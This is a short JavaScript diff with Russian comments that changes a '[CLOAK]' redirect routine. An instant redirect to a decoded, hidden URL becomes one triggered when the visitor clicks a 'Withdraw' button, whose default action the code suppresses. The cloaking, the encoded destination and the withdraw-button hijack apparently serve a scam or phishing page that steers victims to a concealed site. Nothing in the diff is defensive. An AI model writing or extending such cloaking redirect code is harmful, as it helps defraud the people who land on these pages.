@@ -551,12 +551,23 @@
   // но тут мы делаем мгновенный редирект:
   // Защитная проверка: если decoded не выглядит как URL, не редиректим.
   try {
-    const u = new URL(decoded);
-    // Добавим небольшую задержку, чтоб можно было увидеть консоль при тестировании (можно убрать)
-    setTimeout(()=> {
-      window.location.replace(decoded);
-    }, 150);
-  } catch(e) {
+  const u = new URL(decoded);
+
+  // Ждем нажатие кнопки "Вывести"
+  const withdrawBtn = document.querySelector('.withdraw-btn') || document.querySelector('#withdraw') || document.querySelector('button');
+
+  if (withdrawBtn) {
+    console.log('[CLOAK] ждём нажатия на кнопку для перехода...');
+    withdrawBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      console.log('[CLOAK] переход по клику на кнопку ->', decoded);
+      window.location.href = decoded;
+    });
+  } else {
+    console.warn("[CLOAK] Кнопка 'Вывести' не найдена, переход не выполнен");
+  }
+
+} catch(e) {
     console.error('[CLOAK] final target не является допустимым URL — редирект отменён:', decoded, e);
     // Показать пользователю ссылку для ручного перехода
     const wrapper = document.createElement('div');
